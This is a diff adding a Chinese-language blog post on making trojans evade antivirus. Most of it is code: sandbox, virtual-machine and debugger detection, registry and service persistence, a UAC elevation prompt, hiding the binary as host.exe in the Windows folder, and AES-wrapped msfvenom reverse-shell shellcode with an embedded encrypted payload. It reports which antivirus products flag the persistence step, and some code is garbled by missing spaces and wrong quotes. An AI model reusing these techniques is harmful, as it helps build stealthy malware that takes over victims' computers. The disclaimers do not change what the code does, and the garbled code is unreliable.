@@ -1,0 +1,419 @@
+---
+title: 关于木马免杀那点活儿……
+date: 2024-09-01 20:41:25
+tags: #标签
+		- 木马
+		- 信息安全
+		- 渗透测试
+categories: #分类
+		- 网络安全
+		- 
+description: 隐藏木马和反木马的一些小手段
+# Stretches the lines so that each line has equal width(文字向两侧对齊，对最后一行无效)
+text align justify: true
+---
+
+# 前言
+
+本文的一些技术分享仅供同行技术学习交流使用，**禁止使用本文内容从事违法用途**！
+
+---
+
+# 关于木马
+
+- 木马病毒是一种隐藏在正常程序中的一段具有特殊功能的恶意代码，是具备破坏和删除文件、发送密码、记录键盘和攻击 Dos 等特殊功能的后门程序。
+
+- 木马病毒通常会伪装成合法的程序或者文件图片或者任何你可以想到的文件。木马病毒的危害极高，未被激活的木马程序，可以隐藏在后台进程甚至是线程中，不被用户轻易察觉。
+
+- 一旦木马被激活，它可以轻易的窃取用户的敏感信息，如账号密码、设备上存储的个人隐私信息等；还可以轻而易举的控制用户的设备，进行非法操作，例如远程调用摄像头、浏览敏感信息；若在一个企业内网环境中，还会发送钓鱼邮件、当作跳板机攻击其他计算机等，还可以破坏计算机系统、删除文件等。
+
+- 木马的设计成本极低，危害极大，并且传播方式广泛，防不胜防；通常木马程序会伪装成正常合法的文件，来达到欺骗下载的目的，不过也有一些木马制作者可以制作杀毒软件免杀的木马。此种木马危害极高，此类木马平常接触不到，常常活跃在各类企业的钓鱼邮件中，伪装成常见的办公文件，用来绕过企业防火墙和邮件过滤策略，来达到种马的目的；此类木马其核心往往是**一句话木马**，再由**木马免杀**技术的包装后，常见的杀毒终端、云沙箱等安全防护软件都会被其欺骗，从而达到伪装、欺骗下载的目的
+--- 
+
+# 免杀的原理
+
+1. 木马免杀主要是通过修改木马程序的特征，使其能够躲避杀毒软件和安全防护软件的检测。具体原理如下：
+2. 特征修改：
+- 代码混淆：通过对木马程序的源代码进行混淆处理，改变代码的结构和逻辑，使得杀毒软件难以识别出木马的特征码。例如，使用代码加密、变量名随机化、函数重组等技术，让代码看起来更加复杂和难以理解。
+- 加壳处理：给木马程序加上一层外壳，就像给一个物品穿上一层 “保护衣”。这个外壳可以隐藏木马程序的真实内容，使杀毒软件在检测时只能看到外壳的特征，而无法识别内部的木马代码。当木马程序运行时，外壳会先被执行，然后再将内部的木马代码解压并运行。
+- 修改特征码：杀毒软件通常会根据木马程序的特征码来识别和查杀木马。通过分析杀毒软件检测木马的特征码，然后对木马程序进行修改，使其特征码发生变化，从而躲避杀毒软件的检测。
+3. 行为伪装：
+- 模拟正常程序行为：木马程序可以模仿正常程序的行为模式，使其在运行时看起来与正常程序无异。例如，控制木马的网络通信行为，使其与合法的网络应用程序相似，避免被安全软件检测到异常的网络流量。
+- 利用系统漏洞：一些木马会利用操作系统或软件的漏洞来隐藏自己的存在。这些漏洞可能会被木马利用来获取更高的权限，或者绕过安全软件的检测机制。
+## 为什么会有免杀技术
+1. 恶意攻击需求：
+- 黑客和恶意攻击者为了实现非法目的，如窃取用户信息、控制用户计算机等，需要确保他们的木马程序能够在目标系统上成功运行而不被发现。免杀技术可以帮助他们躲避安全防护软件的检测，提高木马的生存能力和攻击成功率。
+- 随着安全防护技术的不断提高，黑客们也在不断寻找新的方法来突破安全防线，免杀技术就是他们应对安全防护的一种手段。
+2. 商业利益驱动：
+	 在一些非法的商业活动中，如网络犯罪产业链中，有人会专门开发和销售免杀的木马程序。这些人通过提供免杀技术来获取经济利益，满足一些不法分子的需求。
+3. 安全技术对抗：
+	 免杀技术的出现也是安全技术对抗的一种表现。安全防护软件不断更新和改进检测算法，而黑客们则会寻找新的方法来绕过这些检测。这种对抗促使双方不断提升技术水平，也使得免杀技术不断发展和演变。
+4. 下面是一些关于免杀和伪装的常见手段
+
+---
+
+# 反沙箱
+
+* 沙箱（Sandbox）是一种隔离机制，通过创建一个受控的、隔离的计算环境，允许软件在不影响宿主系统或网络的情况下运行和测试。这种技术在恶意程序分析中尤为重要，因为它能够安全地捕获和分析恶意软件的行为、特征及其对系统和网络的影响。在国内，常用的两个在线云沙箱分析平台是微步和安恒。
+  > https://s.threatbook.com/ #微步云沙箱
+  > https://sandbox.dbappsecurity.com.cn/ #安恒云沙箱
+
+* 沙箱的特点
+	* 在沙箱环境中，常用的应用程序（如QQ、微信、钉钉等）通常不存在。为了检测是否运行在沙箱环境中，可以写一个白名单机制。将所有常用软件的名称添加到白名单中，然后遍历当前系统中的进程。如果白名单中的程序没有一个在运行，则可以判定当前环境可能为沙箱，从而触发木马程序退出
+	```BASH
+#include <windows.h>
+#include<tlhelp32.h>
+#include<stdio.h>
+#include<stdbool.h>
+
+bool is_process_running(constchar* process_name){
+bool found =false;
+    HANDLE hProcessSnap;
+    PROCESSENTRY32 pe32;
+
+    hProcessSnap =CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+if(hProcessSnap == INVALID_HANDLE_VALUE){
+returnfalse;
+}
+
+    pe32.dwSize =sizeof(PROCESSENTRY32);
+
+if(!Process32First(hProcessSnap,&pe32)){
+CloseHandle(hProcessSnap);
+returnfalse;
+}
+
+do{
+if(strcmp(pe32.szExeFile, process_name)==0){
+            found =true;
+break;
+}
+}while(Process32Next(hProcessSnap,&pe32));
+
+CloseHandle(hProcessSnap);
+return found;
+}
+
+int main(){
+if(!is_process_running('qq.exe')&&!is_process_running('wechat.exe')){
+return0;
+}
+
+return0;
+}
+	```
+	 ![沙箱1](./img/post_img/240901/sx1.png)	
+	 ![沙箱2](./img/post_img/240901/sx2.png)
+	 ![sx3](./img/post_img/240901/sx3.png)
+
+# 反虚拟机
+
+- 在手动分析恶意软件时，通常是在虚拟机环境中进行的。为检测程序是否在虚拟机中运行，可以读取特定的注册表信息。如果检测到当前程序正在虚拟机中运行，则自动退出程序，以避免分析和调试
+
+	```BASH
+	#include <windows.h>
+#include<stdio.h>
+
+intIsRunningInVM(){
+char szHardware[256];
+    DWORD size =sizeof(szHardware);
+int isVM =0;
+
+if(RegGetValueA(HKEY_LOCAL_MACHINE,'SYSTEM\\CurrentControlSet\\Enum\\IDE','HardwareID', RRF_RT_REG_SZ, NULL, szHardware,&size)== ERROR_SUCCESS){
+if(strstr(szHardware,'VMware')|| strstr(szHardware,'Virtual')){
+            isVM =1;
+}
+}
+
+    size =sizeof(szHardware);
+if(RegGetValueA(HKEY_LOCAL_MACHINE,'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum','0', RRF_RT_REG_SZ, NULL, szHardware,&size)== ERROR_SUCCESS){
+if(strstr(szHardware,'VMware')|| strstr(szHardware,'VBOX')){
+            isVM =1;
+}
+}
+
+return isVM;
+}
+int main(int argc,char*argv[]){
+if(IsRunningInVM()){
+return0;
+    }
+	```
+- RegGetValueA 被调用以从注册表路径 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\IDE 中检索 HardwareID 的值， 如果调用成功（返回 ERROR_SUCCESS），则检查检索到的字符串（szHardware）是否包含子字符串 'VMware' 或 'Virtual' ， 如果找到任一子字符串，则将 isVM 设置为 1 ，第二个if判断同理，如果返回1，则代表程序在虚拟机里运行，执行退出指令
+# 反调试
+
+- 使用IsDebuggerPresent函数可以防止逆向工程工具进行动态调试
+
+	```BASH
+
+#include <windows.h>
+#include<stdio.h>
+
+void checkDebugger(){
+if(IsDebuggerPresent()){
+ExitProcess(1);
+}
+
+int main(){
+    checkDebugger();
+return0;
+}
+
+	```
+
+- IsDebuggerPresent() 返回非零值，意味着检测到调试器，程序将调用 ExitProcess(1)退出程序，实测xdbg调试程序时会触发退出
+
+# 添加到开机启动项
+
+- 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' 是一个注册表路径，用于存储当前用户登录时自动运行的程序。我们可以将当前程序的路径写入该注册表项，以实现开机自启动功能
+```BASH
+
+#include <windows.h>
+#include<stdio.h>
+
+void add_to_startup(constchar*appname,constchar*path){
+    HKEY hKey;
+    LONG result;
+
+    result =RegOpenKeyEx(HKEY_CURRENT_USER,
+'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+0, KEY_SET_VALUE,&hKey);
+
+if(result != ERROR_SUCCESS){
+return;
+}
+
+    result =RegSetValueEx(hKey, appname,0, REG_SZ,(BYTE *)path, strlen(path)+1);
+
+RegCloseKey(hKey);
+}
+
+int main(int argc,char*argv[]){
+char path[MAX_PATH];
+if(GetModuleFileName(NULL, path, MAX_PATH)==0){
+return1;
+}
+    add_to_startup('MyAppName', path);
+}
+
+```
+
+- 实测写入注册表时，只有360会有提示，火绒和defender不会有任何弹窗提示。
+
+# AES混淆shellcode
+
+- 首先需要cs或者msf生成raw格式的shellcode源文件，这里用msf举例
+```BASH
+msfvenom -p  windows/x64/shell_reverse_tcp lhost=192.168.0.110 lport=8888 -f raw -o msf.bin
+```
+
+- 然后用python脚本生成aes加密的key和加密后的shellcode
+```python
+
+import sys
+fromCrypto.Cipherimport AES
+fromCrypto.Util.Paddingimport pad
+from os import urandom
+import hashlib
+
+defAESencrypt(plaintext, key):
+    k = hashlib.sha256(KEY).digest()
+    iv =16* b'\x00'
+    plaintext = pad(plaintext, AES.block_size)
+    cipher = AES.new(k, AES.MODE_CBC, iv)
+    ciphertext = cipher.encrypt(plaintext)
+return ciphertext,key
+
+
+def printResult(key, ciphertext):
+print('char AESkey[] = { 0x'+', 0x'.join(hex(x)[2:]for x in KEY)+' };')
+print('unsigned char payload[] = { 0x'+', 0x'.join(hex(x)[2:]for x in ciphertext)+' };')
+
+try:
+    file = open(sys.argv[1],'rb')
+    content = file.read()
+except:
+print('Usage: .\AES_cryptor.py PAYLOAD_FILE')
+    sys.exit()
+
+
+KEY = urandom(16)
+ciphertext, key =AESencrypt(content, KEY)
+
+printResult(KEY,ciphertext)
+
+```
+	![沙箱4](./img/post_img/240901/sx4.png)
+- 在木马里写入aes揭秘脚本即可
+```python
+
+#include <windows.h>
+#include<string.h>
+#include<stdlib.h>
+#include<stdio.h>
+#include<wincrypt.h>
+#include<shlobj.h>
+#pragma comment(lib,'crypt32.lib')
+#pragma comment(lib,'advapi32.lib')
+
+void aes(char* code, DWORD codeLen,char* key, DWORD keyLen){
+    HCRYPTPROV hProv;
+    HCRYPTHASH hHash;
+    HCRYPTKEY hKey;
+
+if(!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+return;
+}
+if(!CryptCreateHash(hProv, CALG_SHA_256,0,0,&hHash)){
+return;
+}
+if(!CryptHashData(hHash,(BYTE*)key, keyLen,0)){
+return;
+}
+if(!CryptDeriveKey(hProv, CALG_AES_256, hHash,0,&hKey)){
+return;
+}
+
+if(!CryptDecrypt(hKey,(HCRYPTHASH)NULL,0,0,(BYTE*)code,&codeLen)){
+return;
+}
+
+CryptReleaseContext(hProv,0);
+CryptDestroyHash(hHash);
+CryptDestroyKey(hKey);
+}
+int main(int argc,char*argv[]){
+unsignedchar key[]={0xed,0x39,0x56,0x67,0xcd,0x62,0xf7,0x91,0x62,0xb,0x85,0x53,0x9b,0x17,0xae,0xc9};
+unsignedchar code[]={0xa0,0x82,0xa3,0xbf,0xce,0xd5,0xd5,0xce,0x0,0xf8,0xc1,0x34,0x7f,0x39,0xcf,0xdb,0xf2,0xd3,0x72,0x2c,0xf2,0x8c,0xf7,0xc4,0xaf,0x66,0xb7,0x82,0xb8,0xbe,0x3,0x31,0xfc,0x3d,0x58,0xd0,0x99,0xda,0xdf,0xc2,0x3,0xd,0xa3,0x3d,0x59,0xb,0x73,0x4b,0x38,0xa6,0x1e,0xd7,0xd7,0x9f,0x63,0x84,0xb8,0xe2,0x0,0x53,0x21,0x7f,0x17,0x67,0xfc,0xc7,0xd0,0x72,0x5e,0x86,0xff,0xa4,0x8d,0x47,0x53,0xa0,0x4,0xee,0x6e,0x16,0xe9,0x4e,0x15,0x2,0x6a,0x84,0x8c,0x59,0xd1,0xb0,0x16,0x3b,0x78,0x6a,0x4a,0x16,0xfe,0x44,0x47,0x4e,0x86,0x97,0xb6,0x3b,0xaa,0xff,0xab,0x4,0x80,0x54,0x5e,0xbd,0x8f,0x88,0x8c,0x34,0xdb,0xe8,0xfd,0x49,0xe9,0x16,0x1f,0xff,0x64,0xb3,0xe0,0xce,0x43,0xb1,0x6f,0x55,0xba,0x68,0x30,0xc8,0x77,0x63,0xc9,0xf0,0x23,0x75,0xe,0x82,0xc2,0x76,0x87,0x3e,0x43,0xcd,0x3b,0xb6,0x97,0x33,0x2,0x7c,0x12,0x5e,0xd3,0x74,0x85,0xc5,0x24,0x42,0x45,0x53,0xda,0x4a,0x3e,0x95,0x40,0x57,0x8d,0xd5,0x70,0x6,0xb8,0x3f,0xa4,0x67,0x4,0x42,0xaa,0x61,0x31,0x70,0x2a,0x28,0x9,0x70,0xdd,0xd1,0xf2,0x73,0xd2,0x2f,0x38,0xd4,0x22,0xab,0x68,0xd2,0x63,0x47,0xb3,0x3a,0xee,0xa9,0x6f,0x53,0x83,0xb6,0x4e,0x25,0xbf,0x18,0x41,0xf8,0x3e,0xcd,0x3b,0x97,0x8,0xb3,0x18,0x5c,0x59,0xbf,0xc6,0x7a,0xa,0x6d,0x80,0x9b,0xa3,0x24,0x89,0x8,0x6a,0x27,0x1a,0x25,0x92,0x12,0x81,0x57,0x90,0x6,0x17,0x92,0xaa,0x7e,0x5d,0x7,0xf8,0xd1,0x38,0x74,0x4f,0xab,0xb2,0xc1,0x15,0xf8,0x65,0xf1,0x59,0x68,0x0,0x14,0x58,0x86,0xcf,0xc4,0x3a,0x3b,0xbb,0xc1,0xc5,0xdb,0xef,0x22,0x85,0x5,0xdc,0x89,0x1e,0xc6,0x50,0x81,0x8,0xd,0x22,0xab,0xd8,0x7d,0xc6,0x3c,0xad,0x49,0x10,0xdf,0x6e,0x92,0x88,0x99,0xb8,0x5d,0xa6,0xe3,0x2d,0xb7,0x4c,0xc6,0xbb,0xce,0xd5,0x4c,0x5f,0x7c,0x22,0xcb,0xe7,0x56,0x12,0xd9,0xe6,0x43,0x3e,0xa7,0xc2,0xca,0xf6,0x11,0x10,0x2b,0xd5,0xa9,0xe2,0x9d,0x53,0xb3,0xcf,0x46,0xca,0x65,0xb0,0x3a,0xa4,0x29,0x18,0x53,0x68,0xfc,0xe6,0xcf,0xa6,0xdb,0x80,0xae,0x84,0x98,0x99,0x2e,0x88,0xac,0x7,0x75,0x35,0x9d,0x24,0x59,0x6b,0x4f,0x78,0x34,0xef,0x2b,0x19,0x72,0x34,0x1a,0x52,0x46,0xe9,0x50,0x26,0x12,0xee,0x10,0xd,0x6d,0x3,0x8b,0x73,0x21,0x11,0x22,0x3d,0x17,0xe2,0x39,0x5c,0x6,0xd7,0x21,0xad,0xd1,0x8f,0xd2,0x5f,0xd2,0xeb,0x20,0xd1,0x1c,0x7c,0x64,0xb9,0xa9,0x76,0x1d,0xfa,0xbc,0x10,0x13,0x67,0x8f,0x71,0xf9,0x1d,0x74,0xb5,0xf2,0xd6,0xed,0xd4,0xcf,0xc,0x4f,0xb1,0x3,0x7b,0x6f,0x55,0x13,0x62,0x1c,0x3b,0x17,0xe6,0xa2,0xbf,0x23,0x5d,0x5,0x7a,0x9d,0x39,0x87,0x51,0x13,0xd9,0xae,0xbb,0xb,0xa8,0xfd,0x6c,0x55,0xde,0x18,0x4c,0x98,0xe1,0x31,0x7b,0xd1,0x37,0xbd,0x91,0xc6,0x63,0x92,0x61,0xb9,0x75,0xb4,0xdc,0xcf,0xb9,0xfe,0x5b,0xb4,0x5d,0xd4,0x22,0x6e,0x8d,0xc0,0xd,0xce,0x97,0xd8,0x8b,0x40,0x5c,0x1c,0xcb,0x3,0xb8,0xe9,0x30,0x49,0x95,0xe0,0x3d,0x13,0xd,0x14,0x15,0xb9,0x6b,0xbd,0x9,0xfc,0x77,0x4d,0xac,0xb,0x28,0x69,0xd5,0xec,0x7,0x47,0x50,0x2,0x9c,0x10,0x11,0xf7,0xe,0x55,0x4,0xa3,0x7e,0x5b,0x96,0x36,0x6b,0x62,0xf6,0x65,0x18,0x44,0x82,0x52,0x98,0x98,0x9f,0x8e,0x5f,0xc1,0x92,0x56,0xc0,0xb4,0x54,0x8c,0x65,0xfe,0xb6,0xc6,0x26,0x4,0x9e,0xf0,0xa7,0x75,0x95,0x1e,0x8e,0xd1,0xb0,0x41,0x83,0xe,0x79,0xa9,0x1b,0x28,0x68,0x75,0x8a,0xd0,0x38,0x8b,0x47,0x5a,0xc2,0xe,0x6d,0x96,0x6e,0xe7,0x45,0xe1,0x7e,0x95,0x80,0xf3,0xc4,0xce,0xc5,0x11,0x70,0x63,0x36,0x79,0x5c,0x9e,0x4f,0x35,0xe2,0x6d,0x28,0x4,0x9d,0xdb,0x2a,0x2d,0x8b,0x5f,0xcf,0xb0,0xda,0xab,0x10,0x9b,0xec,0xaf,0x13,0x34,0xe8,0x65,0x2b,0x6f,0xf4,0xc9,0x43,0x35,0x6c,0x56,0x2f,0xa9};
+
+        DWORD code_length =sizeof(code);
+        aes((char*)code, code_length, key,sizeof(key));
+//现在解密了shellcode，之后运行code函数即可
+
+}
+
+```
+
+# 开机自启动服务项注册
+
+- Windows服务注册需要管理员权限，可以提权后或者弹窗申请管理员权限运行后再执行注册服务功能
+```python
+
+#include <windows.h>
+#include<string.h>
+#include<stdlib.h>
+#include<stdio.h>
+#include<wincrypt.h>
+#include<shlobj.h>
+#pragma comment(lib,'crypt32.lib')
+#pragma comment(lib,'advapi32.lib')
+
+voidCreateServiceToRunAtStartup(){
+    SC_HANDLE schSCManager =OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+if(schSCManager == NULL){
+return;
+}
+
+char path[MAX_PATH];
+SHGetSpecialFolderPath(NULL, path, CSIDL_WINDOWS, FALSE);
+    strcat(path,'\\host.exe');
+
+    SC_HANDLE schService =CreateService(
+        schSCManager,
+'host',
+'host',
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,
+        SERVICE_ERROR_NORMAL,
+        path,
+        NULL, NULL, NULL, NULL, NULL);
+
+if(schService == NULL){
+CloseServiceHandle(schSCManager);
+return;
+}
+
+CloseServiceHandle(schService);
+CloseServiceHandle(schSCManager);
+}
+
+int main(int argc,char*argv[]){
+CreateServiceToRunAtStartup();//会将当前程序注册一个名叫host.exe的windows服务，并且开机自启动
+}
+
+```
+
+# 弹框申请管理员权限运行
+ 
+- 如下
+ ```python
+#include <windows.h>
+#include<string.h>
+#include<stdlib.h>
+#include<stdio.h>
+#include<wincrypt.h>
+#pragma comment(lib,'crypt32.lib')
+
+BOOL IsRunAsAdministrator(){
+    BOOL fIsRunAsAdmin = FALSE;
+    PSID pAdministratorsGroup = NULL;
+
+    SID_IDENTIFIER_AUTHORITY NtAuthority= SECURITY_NT_AUTHORITY;
+if(AllocateAndInitializeSid(&NtAuthority,2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+0,0,0,0,0,0,&pAdministratorsGroup)){
+CheckTokenMembership(NULL, pAdministratorsGroup,&fIsRunAsAdmin);
+FreeSid(pAdministratorsGroup);
+}
+
+return fIsRunAsAdmin;
+}
+
+voidElevatePrivileges(){
+if(!IsRunAsAdministrator()){
+char szPath[MAX_PATH];
+if(GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))){
+            SHELLEXECUTEINFO sei ={sizeof(sei)};
+            sei.lpVerb ='runas';
+            sei.lpFile = szPath;
+            sei.hwnd = NULL;
+            sei.nShow = SW_NORMAL;
+if(!ShellExecuteEx(&sei)){
+exit(1);
+}
+exit(0);
+}
+}
+}
+int main(int argc,char*argv[]){
+ElevatePrivileges();
+}
+ 
+ ```
+	![sx5](./img/post_img/240901/sx5.png)
+	
+# 木马程序转移隐藏
+
+- 运行后将木马转移到了c:/windows目录下，改名为host.exe
+```python
+
+void CopyFilesToWindowsDir(){
+char srcPath[MAX_PATH], destPath[MAX_PATH], dllSrcPath[MAX_PATH];
+GetModuleFileName(NULL, srcPath, MAX_PATH);
+SHGetSpecialFolderPath(NULL, destPath, CSIDL_WINDOWS, FALSE);
+    strcat(destPath,'\\host.exe');
+CopyFile(srcPath, destPath, FALSE);
+}
+
+int main(int argc,char*argv[]){
+CopyFilesToWindowsDir();
+}
+
+```
+
+- **文章部分内容、图片转载于先知社区 （https://xz.aliyun.com ）如侵权请联系删除。**
+--- 
+
+# 再次声明
+
+**本文内容仅供同行技术学习交流使用，禁止使用本文内容进行违法用途！**
